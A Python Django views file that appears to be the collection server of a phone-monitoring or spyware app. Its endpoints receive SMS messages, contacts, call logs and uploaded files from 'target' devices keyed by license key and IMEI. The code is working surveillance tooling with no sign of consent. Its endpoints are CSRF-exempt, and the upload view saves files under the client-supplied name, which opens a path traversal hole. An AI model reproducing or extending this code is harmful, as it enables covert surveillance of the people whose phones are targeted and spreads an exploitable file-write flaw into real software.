from authentication.services import save_call_logs, save_messages, save_contacts
from .models import Target
from .forms import ConnectTargetForm, UploadFilesForm
import datetime
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from django.utils.decorators import method_decorator
from django.views import View
import json


@method_decorator(csrf_exempt, name='dispatch')
class ConnectTargetView(View):
    csrf_exempt = True

    def post(self, request, *args, **kwargs):
        forms = ConnectTargetForm(json.loads(request.body))

        if forms.is_valid() is False:
            return JsonResponse({"error": "Invalid form data"})

        try:
            license_key = kwargs["license_key"]
            target = Target.objects.get(license_key=license_key)
        except Target.DoesNotExist:
            return JsonResponse({"error": "Target not found"})

        last_sync = datetime.datetime.now()

        Target.objects.filter(license_key=license_key).update(
            last_sync=last_sync, status="active", **forms.cleaned_data)

        target = Target.objects.filter(
            license_key=license_key).values().first()

        return JsonResponse({"target": target})


@method_decorator(csrf_exempt, name='dispatch')
class SyncCallbackView(View):
    def post(self, request, *args, **kwargs):
        target_id = kwargs["target_id"]
        imei = kwargs["device_imei"]
        license_key = kwargs["license_key"]
        sync_type = kwargs["sync_type"]

        body = json.loads(request.body)

        target = Target.objects.filter(
            id=target_id, device_imei=imei, license_key=license_key).first()

        if target is None:
            return JsonResponse({"status": "error", "message": "Target not found"})

        if sync_type == "sms":
            messages = body["data"]
            save_messages(messages, target)
        elif sync_type == "contacts":
            save_contacts(body["data"], target)
        elif sync_type == "call_logs":
            save_call_logs(body["data"], target)

        return JsonResponse({"status": "success"})


@method_decorator(csrf_exempt, name='dispatch')
class UploadFilesView(View):
    def post(self, request, *args, **kwargs):
        target_id = kwargs["target_id"]
        imei = kwargs["device_imei"]
        license_key = kwargs["license_key"]

        target = Target.objects.filter(
            id=target_id, device_imei=imei, license_key=license_key).first()

        if target is None:
            return JsonResponse({"status": "error", "message": "Target not found"})

        data = UploadFilesForm(request.POST, request.FILES)
        if not data.is_valid():
            return JsonResponse({"status": "error", "message": "Invalid form data"})
        
        file = data.cleaned_data.get("file")
        if not file:
            return JsonResponse({"status": "error", "message": "No file provided"})
        
        # write to the storage for now
        with open(f"{file.name}", "wb+") as destination:
            for chunk in file.chunks():
                destination.write(chunk)

        return JsonResponse({"status": "success"})